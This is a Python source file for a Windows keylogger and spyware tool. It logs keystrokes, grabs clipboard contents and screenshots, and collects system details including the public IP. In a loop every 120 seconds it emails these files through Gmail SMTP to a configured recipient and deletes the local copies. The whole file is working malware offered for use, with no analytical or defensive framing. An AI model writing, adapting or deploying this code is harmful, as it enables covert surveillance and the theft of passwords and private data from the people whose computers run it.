import os
import time
import socket
import platform
import smtplib
import win32clipboard
from pynput.keyboard import Key, Listener
from PIL import ImageGrab
from requests import get
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import threading

# File paths
keys_information = "key_log.txt"
system_information = "systeminfo.txt"
clipboard_information = "clipboard.txt"
screenshot_information = "screenshot.png"

# Email configuration
email_address = " "  # This email address is the one that will send the email
password = " "  # Password of the email address
toaddr = " "  # This email address is the one that will receive the email

# File storage path
file_path = os.path.dirname(os.path.abspath(__file__))
file_merge = file_path + os.sep

# Function to collect system information
def computer_information():
    with open(file_merge + system_information, "w") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        public_ip = get("https://api.ipify.org").text
        f.write(f"Public IP Address: {public_ip}\n")
        f.write(f"Processor: {platform.processor()}\n")
        f.write(f"System: {platform.system()} {platform.version()}\n")
        f.write(f"Machine: {platform.machine()}\n")
        f.write(f"Hostname: {hostname}\n")
        f.write(f"Private IP Address: {IPAddr}\n")

# Function to copy clipboard content
def copy_clipboard():
    with open(file_merge + clipboard_information, "w") as f:
        win32clipboard.OpenClipboard()
        f.write("Clipboard Data:\n" + win32clipboard.GetClipboardData())
        win32clipboard.CloseClipboard()

# Function to take a screenshot
def screenshot():
    ImageGrab.grab().save(file_merge + screenshot_information)

# Function to send an email with an attachment
def send_email(filename, attachment_path, toaddr):
    msg = MIMEMultipart()
    msg['From'] = email_address
    msg['To'] = toaddr
    msg['Subject'] = "Log File"
    msg.attach(MIMEText(f"Attached: {filename}", 'plain'))

    with open(attachment_path, 'rb') as attachment:
        p = MIMEBase('application', 'octet-stream')
        p.set_payload(attachment.read())
        encoders.encode_base64(p)
        p.add_header('Content-Disposition', f"attachment; filename={filename}")
        msg.attach(p)

    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login(email_address, password)
    s.sendmail(email_address, toaddr, msg.as_string())
    s.quit()

# Keylogger functions
keys = []
def write_file(keys):
    with open(file_merge + keys_information, "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if "space" in k:
                f.write('\n')
            elif "Key" not in k:
                f.write(k)

def on_press(key):
    global keys
    keys.append(key)
    if len(keys) >= 1:
        write_file(keys)
        keys = []

def on_release(key):
    if key == Key.esc:
        return False

def start_keylogger():
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

# Main execution loop
if __name__ == "__main__":
   # Start the keylogger in a separate thread
    listener_thread = threading.Thread(target=start_keylogger)
    listener_thread.start()

    # Run the rest of the functions in the main thread
    while True:
        # Step 1: Collect system info, clipboard content, and take screenshot
        computer_information()
        copy_clipboard()
        screenshot()

        # Step 2: Send collected files via email
        for file in [keys_information, system_information, clipboard_information, screenshot_information]:
            send_email(file, file_merge + file, toaddr)
            os.remove(file_merge + file)

        # Step 3: Wait before next iteration (adjust the time interval as necessary)
        time.sleep(120)  # Adjust the time interval for the next cycle (in minutes)